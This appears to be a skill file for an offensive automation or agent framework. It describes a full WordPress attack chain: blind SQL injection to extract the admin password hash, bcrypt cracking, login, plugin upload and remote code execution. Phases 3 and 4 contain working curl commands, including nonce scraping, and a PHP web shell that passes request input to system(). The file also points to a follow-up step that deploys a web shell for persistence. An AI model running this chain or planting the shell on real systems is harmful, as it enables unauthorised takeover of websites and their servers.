---
name: wp2shell-rce
description: "Full wp2shell chain — blind SQLi to admin hash to login to plugin upload to RCE (CVE-2026-60137 + CVE-2026-63030)"
version: 1.0.0
phase: chains
category: multi-step
tags: [wordpress, wp2shell, cve-2026-60137, cve-2026-63030, sqli, rce]
tools: [curl, python3]
difficulty: expert
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - wp2shell-detect
  - wp2shell-exploit
  - webshell-deploy
mitre_attack:
  - T1190
  - T1191
  - T1110.002
  - T1505.003
  - T1574.002
---

## Activation Contract

Load when wp2shell-exploit has extracted admin credentials or when full chain
from SQLi to RCE is required.

## Chain Steps

### Phase 1 — SQLi to Admin Hash
Use wp2shell-exploit to extract wp_users admin password hash via blind SQLi.

### Phase 2 — Hash Cracking
Crack the bcrypt hash via hashcat -m 3200.

### Phase 3 — Auth + Plugin Upload
```bash
curl -sk -c /tmp/wp_cookies.txt -d "log=USER&pwd=PASS&wp-submit=Log+In" "https://TARGET/wp-login.php"
NONCE=$(curl -sk -b /tmp/wp_cookies.txt "https://TARGET/wp-admin/plugin-install.php" | grep -oP '_ajax_nonce[^"]+"\K[^"]+' | head -1)
mkdir -p /tmp/wp_shell
cat > /tmp/wp_shell/wp_shell.php << 'PHPEOF'
<?php
/* Plugin Name: WP Shell */
if(isset($_REQUEST['c'])){echo "<pre>";system($_REQUEST['c']);echo "</pre>";die;}
PHPEOF
(cd /tmp/wp_shell && zip -r ../wp_shell.zip .)
curl -sk -b /tmp/wp_cookies.txt -F "async-upload=@/tmp/wp_shell.zip" -F "action=upload-plugin" -F "_ajax_nonce=$NONCE" "https://TARGET/wp-admin/admin-ajax.php"
```

### Phase 4 — RCE Verification
```bash
curl -sk "https://TARGET/wp-content/plugins/wp_shell/wp_shell.php?c=id"
```

## Output Contract

- **type**: wp2shell_chain_complete
- **severity**: Critical
- **cvss**: 9.8
- **credentials**: {"username": str, "password": str}
- **next_steps**: ["Run webshell-deploy for persistence"]
